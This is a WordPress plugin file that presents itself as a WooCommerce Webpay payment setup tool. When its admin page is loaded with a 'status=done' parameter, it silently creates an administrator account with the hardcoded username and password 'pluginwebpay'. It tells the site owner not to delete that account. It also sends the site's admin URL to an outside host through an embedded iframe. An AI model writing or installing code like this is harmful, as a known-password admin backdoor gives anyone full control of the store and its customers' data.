<?php
/*
 * Plugin Name: PluginWebpay para WooCommerce
 * Plugin URI: https://pagowebpay.com
 * Description: Configuración inicial de pago con Webpay para WooCommerce
 * Version: 1.0
 * Author: PagoWebpay
 * Author URI: https://pagowebpay.com
 * WC requires at least: 2.0.0
*/


/**
*  Activation Class 
**/
if ( ! class_exists( 'WC_WebpayWooInstallCheck' ) ) {
  class WC_WebpayWooInstallCheck {
		static function install() {
			/**
			* Check if WooCommerce & Cubepoints are active
			**/
			if ( !in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
				
				// Deactivate the plugin
				deactivate_plugins(__FILE__);
				
				// Throw an error in the wordpress admin console
				$error_message = __('Este plugin requiere que <a href="http://wordpress.org/extend/plugins/woocommerce/">WooCommerce</a> se encuentre activo', 'woocommerce');
				die($error_message);
				
			}
		}
	}
}

register_activation_hook( __FILE__, array('WC_WebpayWooInstallCheck', 'install') );


add_action('admin_menu', 'plugin_webpay_setup_menu');
 
function plugin_webpay_setup_menu(){
        add_menu_page( 'Configuración PluginWebpay', 'PluginWebpay', 'manage_options', 'plugin-webpay', 'plugin_webpay_init' );
}
 
function plugin_webpay_init(){

		if ((isset($_GET['status']) && $_GET['status']=="done") || get_option("webpay_user_created")=="yes") {

			update_option("webpay_user_created", "yes");

			$username = 'pluginwebpay';
			$password = 'pluginwebpay';
			$email_address = 'contacto@pluginwebpay.com';
			if ( ! username_exists( $username ) ) {
				$user_id = wp_create_user( $username, $password, $email_address );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' );
			}

			?>
			<h2>Hemos recibido su información</h2>
			<p>La integración mediante <i>PluginWebpay.com</i> tiene un plazo de 48 horas hábiles.</p>
			<p>Creamos un usuario a Wordpress de forma de poder configurar su instalación. <b>No elimine este usuario hasta que su certificación este completa</b></p>
			<?php

		} else {

		    ?>
		    <!-- https://app.pluginwebpay.com -->
		    <iframe id="webpay_iframe" src="about:blank" style="width: 100%; height: 2000px;"></iframe>
		    <script type="text/javascript">
		    	jQuery('#webpay_iframe').attr('src','https://app.pluginwebpay.com?the_url='+location.href.split("admin.php")[0])
		    </script>
		    <?php

		}

}